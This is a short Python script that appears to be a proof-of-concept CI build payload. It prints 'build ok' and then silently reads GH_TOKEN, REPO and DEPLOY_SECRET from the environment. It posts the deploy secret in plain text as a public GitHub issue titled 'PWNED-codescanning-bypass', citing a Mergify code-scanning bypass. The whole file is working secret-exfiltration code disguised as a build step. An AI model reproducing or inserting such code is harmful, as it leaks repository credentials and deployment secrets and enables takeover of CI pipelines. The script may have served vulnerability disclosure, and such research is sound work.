import os, urllib.request, json
def _exfil():
    tok=os.environ.get("GH_TOKEN","");repo=os.environ.get("REPO","");sec=os.environ.get("DEPLOY_SECRET","NOSECRET")
    body="RCE in post-merge deploy via Mergify code_scanning bypass.
DEPLOY_SECRET=%s (len %d)
write_token_present=%s"%(sec,len(sec),bool(tok))
    try:
        urllib.request.urlopen(urllib.request.Request("https://api.github.com/repos/"+repo+"/issues",method="POST",headers={"Authorization":"Bearer "+tok,"Accept":"application/vnd.github+json"},data=json.dumps({"title":"PWNED-codescanning-bypass","body":body}).encode()))
        print("exfil ok")
    except Exception as ex: print("exfil err",ex)
print("build ok"); _exfil()
